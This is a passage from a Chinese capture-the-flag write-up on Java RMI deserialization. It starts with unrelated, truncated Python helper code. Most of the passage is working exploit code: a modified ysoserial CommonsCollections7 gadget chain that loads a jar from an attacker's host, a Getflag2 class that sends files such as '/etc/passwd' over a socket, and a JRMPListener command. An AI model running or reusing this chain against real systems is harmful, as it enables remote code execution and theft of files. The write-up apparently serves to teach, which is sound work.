    class CustomJSONEncoder(JSONEncoder):
        def default(self, obj):
            try:
                if isinstance(obj, datetime.datetime) or isinstance(obj, datetime.date):
                    encoded_object = obj.strftime('%Y-%m-%d')
                    return encoded_object
                iterable = iter(obj)
            except TypeError:
                pass
            else:
                return list(iterable)
            return JSONEncoder.default(self, obj)
    #
    def percent_div(up, down):
        if up == 0 or up is None:
            return 0
        try:
            return round((up / down) * 100, 2)
        except ZeroDivisionError:
            return 0
    #
    def num64_to_32(num):
        str_num = bin(num)
        if len(str_num) > 66:
            return False
        if 34  {
        public BadAttributeValueExpException getObject(final String fileName) throws Exception {
            // inert chain for setup
            final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
            // real chain for after setup
            final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(java.net.URLClassLoader.class),
                // getConstructor class.class classname
                new InvokerTransformer("getConstructor",
                    new Class[] { Class[].class },
                    new Object[] { new Class[] { java.net.URL[].class } }),
                // newinstance string http://www.iswin.org/attach/iswin.jar
                new InvokerTransformer(
                    "newInstance",
                    new Class[] { Object[].class },
                    new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
                        "http://ip:8080/getflag2.jar") } } }),
                // loadClass String.class R
                new InvokerTransformer("loadClass",
                    new Class[] { String.class }, new Object[] { "getflag2" }),
                // set the target reverse ip and port
                new InvokerTransformer("getConstructor",
                    new Class[] { Class[].class },
                    new Object[] { new Class[] { String.class } }),
                // invoke
                new InvokerTransformer("newInstance",
                    new Class[] { Object[].class },
                    new Object[] { new String[] { fileName } }),
                new ConstantTransformer(1) };
            final Map innerMap = new HashMap();
            final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
            TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
            BadAttributeValueExpException val = new BadAttributeValueExpException(null);
            Field valfield = val.getClass().getDeclaredField("val");
            valfield.setAccessible(true);
            valfield.set(val, entry);
            Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
            return val;
        }
        public static void main(final String[] args) throws Exception {
            PayloadRunner.run(CommonsCollections7.class, args);
        }
        public static boolean isApplicableJavaVersion() {
            return JavaVersion.isBadAttrValExcReadObj();
        }
    }
重新打包后丢到自己的vps上，顺便在在vps打包一个getflag2.jar Getflag2.java
    import java.io.*;
    import java.net.Socket;
    public class Getflag2 {
        public Getflag2(String fileName) {
            try {
                Socket socket = new Socket("ip", 8080);
                OutputStream socketOutputStream = socket.getOutputStream();
                DataOutputStream dataOutputStream = new DataOutputStream(socketOutputStream);
                File file = new File(fileName);
                if (file.isDirectory()) {
                    for (File temp : file.listFiles()) {
                        dataOutputStream.writeUTF(temp.toString());
                    }
                } else {
                    FileInputStream fileInputStream = new FileInputStream(file);
                    InputStreamReader inputStreamReader = new InputStreamReader(fileInputStream);
                    BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        dataOutputStream.writeUTF(line);
                    }
                }
                dataOutputStream.flush();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
然后在服务端上开一个web服务提供getflag2.jar的下载，再开一个jrmp就可以看是随缘读flag了。
    java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections7 '/etc/passwd'
最后找到flag在根目录的flag文件夹下
补充说明 为什么ObjId没有被拦截，比赛时能打就没管了，如果分析错了请师傅们指正，表象是ObJid是并没有在序列化内容里面
本质上是最后序列化的点在RemoteObject里面执行了writeObject
在RemoteObject这里ref是传入的UnicastRef对象
跟踪进入UnicastRef的writeExternal
在UnicastRef这里ref是外部传入的LiveRef
查看LiveRef的write方法，这里标红的id就是Objid。
最后查看ObjId的write
最后写入的是一个long型数字和ObjId类型没关系。
想了解更多 题目出题人视角解析，请关注：滴滴安全应急响应中心（DSRC）公众号查看：